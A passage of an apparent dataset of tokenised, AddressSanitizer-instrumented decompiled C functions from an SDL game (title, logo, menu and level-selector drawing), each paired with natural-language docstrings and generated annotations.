            "*",
            ")",
            "(",
            "v7",
            ">",
            ">",
            "3",
            ")",
            ";",
            "v9",
            "[",
            "536862720",
            "]",
            "=",
            "-",
            "235802127",
            ";",
            "v9",
            "[",
            "536862721",
            "]",
            "=",
            "-",
            "218959356",
            ";",
            "v9",
            "[",
            "536862722",
            "]",
            "=",
            "-",
            "218959118",
            ";",
            "v9",
            "[",
            "536862723",
            "]",
            "=",
            "-",
            "219021312",
            ";",
            "v17",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v7",
            "+",
            "32",
            ")",
            "=",
            "0",
            ";",
            "surfaceMessage",
            "=",
            "(",
            "SDL_Surface_0",
            "*",
            ")",
            "TTF_RenderText_Solid",
            "(",
            "Font",
            ",",
            "text",
            ",",
            "*",
            "(",
            "unsigned",
            "int",
            "*",
            ")",
            "(",
            "v7",
            "+",
            "32",
            ")",
            ")",
            ";",
            "Message",
            "=",
            "(",
            "SDL_Texture_0",
            "*",
            ")",
            "SDL_CreateTextureFromSurface",
            "(",
            "rend",
            ",",
            "surfaceMessage",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v7",
            "+",
            "96",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v7",
            "+",
            "96",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "=",
            "3",
            ")",
            "__asan_report_store4",
            "(",
            "v7",
            "+",
            "96",
            ")",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v7",
            "+",
            "96",
            ")",
            "=",
            "x",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v7",
            "+",
            "100",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "v7",
            "+",
            "100",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v7",
            "+",
            "100",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_store4",
            "(",
            "v7",
            "+",
            "100",
            ")",
            ";",
            "}",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v7",
            "+",
            "100",
            ")",
            "=",
            "y",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v7",
            "+",
            "104",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v7",
            "+",
            "104",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "=",
            "3",
            ")",
            "__asan_report_store4",
            "(",
            "v7",
            "+",
            "104",
            ")",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v7",
            "+",
            "104",
            ")",
            "=",
            "w",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v7",
            "+",
            "108",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "v7",
            "+",
            "108",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v7",
            "+",
            "108",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_store4",
            "(",
            "v7",
            "+",
            "108",
            ")",
            ";",
            "}",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v7",
            "+",
            "108",
            ")",
            "=",
            "h",
            ";",
            "SDL_RenderCopy",
            "(",
            "rend",
            ",",
            "Message",
            ",",
            "0L",
            "L",
            ",",
            "v7",
            "+",
            "96",
            ")",
            ";",
            "SDL_FreeSurface",
            "(",
            "surfaceMessage",
            ")",
            ";",
            "SDL_DestroyTexture",
            "(",
            "Message",
            ")",
            ";",
            "if",
            "(",
            "v16",
            "=",
            "=",
            "(",
            "char",
            "*",
            ")",
            "v7",
            ")",
            "{",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v7",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v7",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8008",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "}",
            "else",
            "{",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "v7",
            "=",
            "1172321806L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v7",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "=",
            "0xF5F5F5F5F5F5F5F5L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v7",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8008",
            ")",
            "=",
            "0xF5F5F5F5F5F5F5F5L",
            "L",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The \"stack\" function likely implements a stack data structure, potentially for various purposes such as managing memory, handling function calls, or supporting binary search tree operations, as indicated by the different code snippets showcasing struct definitions and comments related to stack data.",
            "The provided code snippets define various mathematical and utility functions in C, and the `malloc` function allocates memory by using `GlobalAlloc`, likely intended for a Windows environment, adhering to the behavior of the standard `malloc` function in C.",
            "The function \"qword\" likely deals with manipulating or analyzing quadruple-word data structures, possibly in a low-level programming context."
        ],
        "longer_label": "The provided code defines a C function `drawTitle` utilizing SDL to render text on a given SDL renderer, with annotations suggesting it may be part of a larger program handling memory management, mathematical operations, and potentially low-level data manipulation."
    },
    {
        "id": 197,
        "docstring_tokens": [
            "The",
            "function",
            "`",
            "drawLogo",
            "`",
            "takes",
            "in",
            "a",
            "SDL",
            "renderer",
            "and",
            "texture",
            ",",
            "queries",
            "the",
            "texture",
            "for",
            "its",
            "dimensions",
            ",",
            "and",
            "then",
            "renders",
            "the",
            "texture",
            "at",
            "position",
            "(",
            "0",
            ",",
            "150",
            ")",
            "on",
            "the",
            "renderer",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            "SDL_Renderer_0",
            "*",
            "rend",
            ",",
            "SDL_Texture_0",
            "*",
            "img",
            ")",
            "{",
            "unsigned",
            "__int64",
            "v2",
            ";",
            "__int64",
            "v3",
            ";",
            "_DWORD",
            "*",
            "v4",
            ";",
            "int",
            "v5",
            ";",
            "int",
            "v6",
            ";",
            "char",
            "v7",
            "[",
            "216",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v8",
            ";",
            "v2",
            "=",
            "(",
            "unsigned",
            "__int64",
            ")",
            "v7",
            ";",
            "if",
            "(",
            "_asan_option_detect_stack_use_after_return",
            ")",
            "{",
            "v3",
            "=",
            "__asan_stack_malloc_2",
            "(",
            "192L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "v3",
            ")",
            "v2",
            "=",
            "v3",
            ";",
            "}",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "v2",
            "=",
            "1102416563L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v2",
            "+",
            "8",
            ")",
            "=",
            "\"3 32 4 1 w 96 4 1 h 160 16 4 texr \"",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v2",
            "+",
            "16",
            ")",
            "=",
            "drawLogo",
            ";",
            "v4",
            "=",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v2",
            ">",
            ">",
            "3",
            ")",
            ";",
            "v4",
            "[",
            "536862720",
            "]",
            "=",
            "-",
            "235802127",
            ";",
            "v4",
            "[",
            "536862721",
            "]",
            "=",
            "-",
            "218959356",
            ";",
            "v4",
            "[",
            "536862722",
            "]",
            "=",
            "-",
            "218959118",
            ";",
            "v4",
            "[",
            "536862723",
            "]",
            "=",
            "-",
            "218959356",
            ";",
            "v4",
            "[",
            "536862724",
            "]",
            "=",
            "-",
            "218959118",
            ";",
            "v4",
            "[",
            "536862725",
            "]",
            "=",
            "-",
            "219021312",
            ";",
            "v8",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "SDL_QueryTexture",
            "(",
            "img",
            ",",
            "0L",
            "L",
            ",",
            "0L",
            "L",
            ",",
            "v2",
            "+",
            "32",
            ",",
            "v2",
            "+",
            "96",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v2",
            "+",
            "160",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v2",
            "+",
            "160",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "=",
            "3",
            ")",
            "__asan_report_store4",
            "(",
            "v2",
            "+",
            "160",
            ")",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v2",
            "+",
            "160",
            ")",
            "=",
            "0",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v2",
            "+",
            "164",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "v2",
            "-",
            "96",
            "+",
            "4",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v2",
            "+",
            "164",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_store4",
            "(",
            "v2",
            "+",
            "164",
            ")",
            ";",
            "}",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v2",
            "+",
            "164",
            ")",
            "=",
            "150",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v2",
            "+",
            "32",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v2",
            "+",
            "32",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "=",
            "3",
            ")",
            "__asan_report_load4",
            "(",
            "v2",
            "+",
            "32",
            ")",
            ";",
            "v5",
            "=",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v2",
            "+",
            "32",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v2",
            "+",
            "168",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v2",
            "+",
            "168",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "=",
            "3",
            ")",
            "__asan_report_store4",
            "(",
            "v2",
            "+",
            "168",
            ")",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v2",
            "+",
            "168",
            ")",
            "=",
            "v5",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v2",
            "+",
            "96",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v2",
            "+",
            "96",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "=",
            "3",
            ")",
            "__asan_report_load4",
            "(",
            "v2",
            "+",
            "96",
            ")",
            ";",
            "v6",
            "=",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v2",
            "+",
            "96",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v2",
            "+",
            "172",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "v2",
            "-",
            "96",
            "+",
            "12",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v2",
            "+",
            "172",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_store4",
            "(",
            "v2",
            "+",
            "172",
            ")",
            ";",
            "}",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v2",
            "+",
            "172",
            ")",
            "=",
            "v6",
            ";",
            "SDL_RenderCopy",
            "(",
            "rend",
            ",",
            "img",
            ",",
            "0L",
            "L",
            ",",
            "v2",
            "+",
            "160",
            ")",
            ";",
            "if",
            "(",
            "v7",
            "=",
            "=",
            "(",
            "char",
            "*",
            ")",
            "v2",
            ")",
            "{",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v2",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v2",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8008",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v2",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8010",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "}",
            "else",
            "{",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "v2",
            "=",
            "1172321806L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v2",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "=",
            "0xF5F5F5F5F5F5F5F5L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v2",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8008",
            ")",
            "=",
            "0xF5F5F5F5F5F5F5F5L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v2",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8010",
            ")",
            "=",
            "0xF5F5F5F5F5F5F5F5L",
            "L",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function named \"stack\" likely represents a data structure or module intended for implementing and managing stacks, commonly used in computer science for organizing data in a last-in, first-out (LIFO) manner, with the provided code snippets showcasing different implementations and applications of stacks within various contexts such as memory management, runtime environments, and binary search trees.",
            "The function `malloc` appears to be a memory allocation function used for dynamic memory allocation in C/C++ programs, as it is implemented to allocate memory using `GlobalAlloc` in the provided code snippet."
        ],
        "longer_label": "The provided code appears to define a function `drawLogo` in C/C++ utilizing SDL (Simple DirectMedia Layer) for rendering, involving memory allocation, stack manipulation, and texture rendering, with annotations hinting at the presence of a stack data structure and dynamic memory allocation."
    },
    {
        "id": 198,
        "docstring_tokens": [
            "The",
            "function",
            "drawMenu",
            "(",
            ")",
            "draws",
            "a",
            "menu",
            "with",
            "two",
            "options",
            "(",
            "Sandbox",
            "and",
            "Career",
            ")",
            "in",
            "SDL",
            "Renderer",
            ",",
            "based",
            "on",
            "the",
            "mouse",
            "position",
            "to",
            "highlight",
            "the",
            "selected",
            "option",
            "with",
            "a",
            "colored",
            "box",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            "SDL_Renderer_0",
            "*",
            "rend",
            ",",
            "TTF_Font",
            "*",
            "Font",
            ",",
            "SDL_Texture_0",
            "*",
            "img",
            ")",
            "{",
            "unsigned",
            "__int64",
            "v3",
            ";",
            "__int64",
            "v4",
            ";",
            "_DWORD",
            "*",
            "v5",
            ";",
            "char",
            "v7",
            "[",
            "152",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v8",
            ";",
            "v3",
            "=",
            "(",
            "unsigned",
            "__int64",
            ")",
            "v7",
            ";",
            "if",
            "(",
            "_asan_option_detect_stack_use_after_return",
            ")",
            "{",
            "v4",
            "=",
            "__asan_stack_malloc_1",
            "(",
            "128L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "v4",
            ")",
            "v3",
            "=",
            "v4",
            ";",
            "}",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "v3",
            "=",
            "1102416563L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v3",
            "+",
            "8",
            ")",
            "=",
            "\"2 32 4 7 mouse_x 96 4 7 mouse_y \"",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v3",
            "+",
            "16",
            ")",
            "=",
            "drawMenu",
            ";",
            "v5",
            "=",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v3",
            ">",
            ">",
            "3",
            ")",
            ";",
            "v5",
            "[",
            "536862720",
            "]",
            "=",
            "-",
            "235802127",
            ";",
            "v5",
            "[",
            "536862721",
            "]",
            "=",
            "-",
            "218959356",
            ";",
            "v5",
            "[",
            "536862722",
            "]",
            "=",
            "-",
            "218959118",
            ";",
            "v5",
            "[",
            "536862723",
            "]",
            "=",
            "-",
            "218959356",
            ";",
            "v8",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "SDL_GetMouseState",
            "(",
            "v3",
            "+",
            "32",
            ",",
            "v3",
            "+",
            "96",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v3",
            "+",
            "32",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v3",
            "+",
            "32",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "=",
            "3",
            ")",
            "__asan_report_load4",
            "(",
            "v3",
            "+",
            "32",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "int",
            "*",
            ")",
            "(",
            "v3",
            "+",
            "32",
            ")",
            "<",
            "=",
            "649",
            "|",
            "|",
            "*",
            "(",
            "int",
            "*",
            ")",
            "(",
            "v3",
            "+",
            "32",
            ")",
            ">",
            "950",
            ")",
            "goto",
            "LABEL_13",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v3",
            "+",
            "96",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v3",
            "+",
            "96",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "=",
            "3",
            ")",
            "__asan_report_load4",
            "(",
            "v3",
            "+",
            "96",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "int",
            "*",
            ")",
            "(",
            "v3",
            "+",
            "96",
            ")",
            "<",
            "=",
            "119",
            "|",
            "|",
            "*",
            "(",
            "int",
            "*",
            ")",
            "(",
            "v3",
            "+",
            "96",
            ")",
            ">",
            "320",
            ")",
            "LABEL_13",
            ":",
            "drawBox",
            "(",
            "rend",
            ",",
            "650",
            ",",
            "120",
            ",",
            "300",
            ",",
            "200",
            ",",
            "255",
            ",",
            "0",
            ",",
            "0",
            ")",
            ";",
            "else",
            "drawBox",
            "(",
            "rend",
            ",",
            "650",
            ",",
            "120",
            ",",
            "300",
            ",",
            "200",
            ",",
            "255",
            ",",
            "100",
            ",",
            "0",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v3",
            "+",
            "32",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v3",
            "+",
            "32",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "=",
            "3",
            ")",
            "__asan_report_load4",
            "(",
            "v3",
            "+",
            "32",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "int",
            "*",
            ")",
            "(",
            "v3",
            "+",
            "32",
            ")",
            "<",
            "=",
            "649",
            "|",
            "|",
            "*",
            "(",
            "int",
            "*",
            ")",
            "(",
            "v3",
            "+",
            "32",
            ")",
            ">",
            "950",
            ")",
            "goto",
            "LABEL_23",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v3",
            "+",
            "96",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v3",
            "+",
            "96",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "=",
            "3",
            ")",
            "__asan_report_load4",
            "(",
            "v3",
            "+",
            "96",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "int",
            "*",
            ")",
            "(",
            "v3",
            "+",
            "96",
            ")",
            "<",
            "=",
            "419",
            "|",
            "|",
            "*",
            "(",
            "int",
            "*",
            ")",
            "(",
            "v3",
            "+",
            "96",
            ")",
            ">",
            "620",
            ")",
            "LABEL_23",
            ":",
            "drawBox",
            "(",
            "rend",
            ",",
            "650",
            ",",
            "420",
            ",",
            "300",
            ",",
            "200",
            ",",
            "255",
            ",",
            "0",
            ",",
            "0",
            ")",
            ";",
            "else",
            "drawBox",
            "(",
            "rend",
            ",",
            "650",
            ",",
            "420",
            ",",
            "300",
            ",",
            "200",
            ",",
            "255",
            ",",
            "100",
            ",",
            "0",
            ")",
            ";",
            "drawOptions",
            "(",
            "rend",
            ",",
            "Font",
            ",",
            "680",
            ",",
            "170",
            ",",
            "240",
            ",",
            "100",
            ",",
            "\"Sandbox\"",
            ")",
            ";",
            "drawOptions",
            "(",
            "rend",
            ",",
            "Font",
            ",",
            "700",
            ",",
            "470",
            ",",
            "200",
            ",",
            "100",
            ",",
            "\"Career\"",
            ")",
            ";",
            "drawLogo",
            "(",
            "rend",
            ",",
            "img",
            ")",
            ";",
            "if",
            "(",
            "v7",
            "=",
            "=",
            "(",
            "char",
            "*",
            ")",
            "v3",
            ")",
            "{",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v3",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v3",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8008",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "}",
            "else",
            "{",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "v3",
            "=",
            "1172321806L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v3",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "=",
            "0xF5F5F5F5F5F5F5F5L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v3",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8008",
            ")",
            "=",
            "0xF5F5F5F5F5F5F5F5L",
            "L",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "",
            "The `malloc` function appears to be a memory allocation function that dynamically allocates memory, likely used for managing memory resources in programs by allocating memory blocks of a specified size, typically used in C programming.",
            "The `SDL_GetMouse` function is used to retrieve the current position of the mouse cursor and handle mouse-related events within an SDL-based application, including updating cursor states and positions."
        ],
        "longer_label": "The provided code defines a function `drawMenu` in C, which allocates memory for a menu, retrieves the current mouse position using SDL library functions, draws boxes and options on the screen, and manages memory allocation, likely for a graphical user interface (GUI) application."
    },
    {
        "id": 199,
        "docstring_tokens": [
            "The",
            "code",
            "draws",
            "a",
            "level",
            "selector",
            "menu",
            "with",
            "options",
            "from",
            "1",
            "to",
            "6",
            "and",
            "highlights",
            "the",
            "option",
            "that",
            "the",
            "mouse",
            "cursor",
            "is",
            "currently",
            "hovering",
            "over",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            "SDL_Renderer_0",
            "*",
            "rend",
            ",",
            "TTF_Font",
            "*",
            "Font",
            ",",
            "SDL_Texture_0",
            "*",
            "img",
            ")",
            "{",
            "unsigned",
            "__int64",
            "v3",
            ";",
            "__int64",
            "v4",
            ";",
            "_DWORD",
            "*",
            "v5",
            ";",
            "char",
            "v7",
            "[",
            "152",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v8",
            ";",
            "v3",
            "=",
            "(",
            "unsigned",
            "__int64",
            ")",
            "v7",
            ";",
            "if",
            "(",
            "_asan_option_detect_stack_use_after_return",
            ")",
            "{",
            "v4",
            "=",
            "__asan_stack_malloc_1",
            "(",
            "128L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "v4",
            ")",
            "v3",
            "=",
            "v4",
            ";",
            "}",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "v3",
            "=",
            "1102416563L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v3",
            "+",
            "8",
            ")",
            "=",
            "\"2 32 4 7 mouse_x 96 4 7 mouse_y \"",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v3",
            "+",
            "16",
            ")",
            "=",
            "drawLevelSelector",
            ";",
            "v5",
            "=",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v3",
            ">",
            ">",
            "3",
            ")",
            ";",
            "v5",
            "[",
            "536862720",
            "]",
            "=",
            "-",
            "235802127",
            ";",
            "v5",
            "[",
            "536862721",
            "]",
            "=",
            "-",
            "218959356",
            ";",
            "v5",
            "[",
            "536862722",
            "]",
            "=",
            "-",
            "218959118",
            ";",
            "v5",
            "[",
            "536862723",
            "]",
            "=",
            "-",
            "218959356",
            ";",
            "v8",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "SDL_GetMouseState",
            "(",
            "v3",
            "+",
            "32",
            ",",
            "v3",
            "+",
            "96",
            ")",
            ";",
            "drawTitle",
            "(",
            "rend",
            ",",
            "Font",
            ",",
            "500",
            ",",
            "40",
            ",",
            "200",
            ",",
            "40",
            ",",
            "\"Select level: \"",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v3",
            "+",
            "32",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v3",
            "+",
            "32",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "=",
            "3",
            ")",
            "__asan_report_load4",
            "(",
            "v3",
            "+",
            "32",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "int",
            "*",
            ")",
            "(",
            "v3",
            "+",
            "32",
            ")",
            "<",
            "=",
            "599",
